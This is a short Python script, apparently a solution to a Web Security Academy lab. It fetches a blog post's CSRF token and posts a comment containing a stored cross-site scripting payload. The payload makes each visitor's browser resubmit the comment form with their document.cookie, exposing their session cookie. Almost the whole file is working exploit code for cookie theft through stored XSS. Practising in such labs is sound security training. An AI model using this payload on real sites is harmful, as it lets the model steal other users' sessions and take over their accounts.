import requests
from bs4 import BeautifulSoup

site = '0a39006203d4e7fe806f0338003d005b.web-security-academy.net'
s = requests.Session()

comment_xss = '''
<script>
  document.addEventListener("DOMContentLoaded", function() {
    document.forms[0].name.value = 'Jarren Calizo';
    document.forms[0].email.value = 'calizo@pdx.edu';
    document.forms[0].postId.value = 1;
    document.forms[0].csrf.value = document.getElementsByName('csrf')[0].value;
    document.forms[0].comment.value = document.cookie;
    document.forms[0].website.value = 'https://pdx.edu';
    document.forms[0].submit();
  });
</script>
'''

def post_payload():
    blog_post_url = f'https://{site}/post?postId=1'
    resp = s.get(blog_post_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']

    comment_data = {
        'csrf': csrf,
        'postId': '1',
        'comment': comment_xss,
        'name': 'Jarren Calizo',
        'email': 'calizo@pdx.edu',
        'website': 'https://pdx.edu'
    }

    post_url = f'https://{site}/post/comment'
    resp = s.post(post_url, data=comment_data)
    print("Payload posted.")

post_payload()